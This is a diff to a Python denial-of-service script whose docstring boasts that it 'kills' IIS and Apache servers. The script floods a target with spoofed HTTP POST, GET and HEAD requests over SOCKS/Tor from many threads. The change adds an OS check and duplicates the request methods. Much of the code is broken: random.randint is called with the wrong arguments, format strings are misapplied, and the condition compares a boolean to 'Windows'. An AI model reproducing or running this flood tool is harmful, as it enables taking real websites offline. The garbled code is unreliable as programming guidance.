@@ -13,14 +13,17 @@ Kills newer IIS and Apache 2.X with ~200 threads.
 
 Modded by haigiang02 from zunzutech.com/Insane Developer from HF
 """
-import os,re,time,sys,random,math,getopt,socks,string,terminal
+import os,re,time,sys,random,math,getopt,socks,string,terminal,platform
 from threading import Thread
 
 global stop_now
 global term
 stop_now = False
 term = terminal.TerminalController()
-
+if platform.system() != "Windows":
+    longer = True
+else:
+    longer = False
 useragents = [
  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)",
  "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)",
@@ -89,8 +92,8 @@ def buildblock(size):
     _NUMERIC = range(48, 57)
     validChars = _LOWECASE + _UPPERCASE + _NUMERIC
     for i in range(0, size):
-	    a = random.choice(validChars)
-	    out_str += chr(a)
+        a = random.choice(validChars)
+        out_str += chr(a)
     return(out_str)
 def querystring(ammount=1):
     queryString = []
@@ -109,32 +112,60 @@ class httpPost(Thread):
         self.socks = socks.socksocket()
         self.tor = tor
         self.running = True
-    def _send_http_post(self, pause=random.randint(6,10,11,12,7,5)): 
-        global stop_now
-        self.socks.send("POST / HTTP/1.1\r\n"
-                        "Host: %s\r\n"
-                        "User-Agent: %s\r\n"
-                        "Connection: keep-alive\r\n"
-                        "Referer: %s\r\n"
-                        "Cookie: %s\r\n"
-                        "Keep-Alive: %s\r\n" 
-                        "Cache-Control: no-cache\r\n"
-                        "Content-Length: 99768\r\n"
-                        "Content-Type: application/x-www-form-urlencoded\r\n\r\n" % 
-                        (self.host, random.randint(useragents), random.randint(300, 894), random.choice(referers) + buildblock(random.randint(5,10)), querystring(random.randint(1, 5))))
-    def _send_http_get(self, pause=random.randint(6,10,11,12,7,5)):
-        global stop_now
-        self.socks.send("GET / HTTP/1.1\r\n"
-			"Host: %s\r\n"
-			"User-Agent: %s\r\n"
-			"Connection: keep-alive\r\n"
-			"Keep-Alive: %s\r\n"
-			"Accept-Encoding: gzip\r\n"
-			"Accept-Language: en\r\n"
-			"Referer: %s\r\n"
-			"Window-Size: 0\r\n\r\n" %
-			"Cookie: %s\r\n" %
-			(self.host, random.choice(useragents), random.randint(300,894), random.choice(referers) + buildblock(random.randint(5,10)), querystring(random.randint(1, 5))))
+        if longer != "Windows":
+            def _send_http_post(self, pause=random.randint(5,12)): 
+                global stop_now
+                self.socks.send("POST / HTTP/1.1\r\n"
+                                "Host: %s\r\n"
+                                "User-Agent: %s\r\n"
+                                "Connection: keep-alive\r\n"
+                                "Referer: %s\r\n"
+                                "Cookie: %s\r\n"
+                                "Keep-Alive: %s\r\n" 
+                                "Cache-Control: no-cache\r\n"
+                                "Content-Length: 99768\r\n"
+                                "Content-Type: application/x-www-form-urlencoded\r\n\r\n" % 
+                                (self.host, random.randint(useragents), random.randint(300, 894), random.choice(referers) + buildblock(random.randint(5,10)), querystring(random.randint(1, 5))))
+            def _send_http_get(self, pause=random.randint(5,12)):
+                global stop_now
+                self.socks.send("GET / HTTP/1.1\r\n"
+                    "Host: %s\r\n"
+                    "User-Agent: %s\r\n"
+                    "Connection: keep-alive\r\n"
+                    "Keep-Alive: %s\r\n"
+                    "Accept-Encoding: gzip\r\n"
+                    "Accept-Language: en\r\n"
+                    "Referer: %s\r\n"
+                    "Window-Size: 0\r\n\r\n" %
+                    "Cookie: %s\r\n" %
+                    (self.host, random.choice(useragents), random.randint(300,894), random.choice(referers) + buildblock(random.randint(5,10)), querystring(random.randint(1, 5))))
+        else:
+            def _send_http_post(self, pause=random.randint(6,10,11,12,7,5)):
+                global stop_now
+                self.socks.send("POST / HTTP/1.1\r\n"
+                                "Host: %s\r\n"
+                                "User-Agent: %s\r\n"
+                                "Connection: keep-alive\r\n"
+                                "Referer: %s\r\n"
+                                "Cookie: %s\r\n"
+                                "Keep-Alive: %s\r\n" 
+                                "Cache-Control: no-cache\r\n"
+                                "Content-Length: 99768\r\n"
+                                "Content-Type: application/x-www-form-urlencoded\r\n\r\n" % 
+                                (self.host, random.randint(useragents), random.randint(300, 894), random.choice(referers) + buildblock(random.randint(5,10)), querystring(random.randint(1, 5))))
+            def _send_http_get(self, pause=random.randint(6,10,11,12,7,5)):
+                global stop_now
+                self.socks.send("GET / HTTP/1.1\r\n"
+                    "Host: %s\r\n"
+                    "User-Agent: %s\r\n"
+                    "Connection: keep-alive\r\n"
+                    "Keep-Alive: %s\r\n"
+                    "Accept-Encoding: gzip\r\n"
+                    "Accept-Language: en\r\n"
+                    "Referer: %s\r\n"
+                    "Window-Size: 0\r\n\r\n" %
+                    "Cookie: %s\r\n" %
+                    (self.host, random.choice(useragents), random.randint(300,894), random.choice(referers) + buildblock(random.randint(5,10)), querystring(random.randint(1, 5))))
     def _send_http_head(self, pause=random.randint(5,10)):
         global stop_now
         self.socks.send("HEAD / HTTP/1.1\r\n"
@@ -143,10 +174,10 @@ class httpPost(Thread):
                         "Connection: keep-alive\r\n"
                         "Keep-Alive: %s\r\n"
                         "Accept-Encoding: gzip\r\n"
-			"Accept-Language: en\r\n"
-			"Referer: %s\r\n"
-			"Cookie: %s\r\n" %
-			(self.host, random.choice(useragents), random.randint(300,894), random.choice(referers) + buildblock(random.randint(5,10)), querystring(random.randint(1, 5))))
+            "Accept-Language: en\r\n"
+            "Referer: %s\r\n"
+            "Cookie: %s\r\n" %
+            (self.host, random.choice(useragents), random.randint(300,894), random.choice(referers) + buildblock(random.randint(5,10)), querystring(random.randint(1, 5))))
         for i in range(0, 9999):
             if stop_now:
                 self.running = False
@@ -159,7 +190,7 @@ class httpPost(Thread):
         self.socks.send(p)
         time.sleep(random.uniform(0.1, 3))
         self.socks.close()
-		
+        
     def run(self):
         while self.running:
             while self.running:
@@ -198,7 +229,7 @@ def main(argv):
         usage() 
         sys.exit(-1)
     global stop_now
-	
+    
     target = ''
     threads = 1024
     tor = False
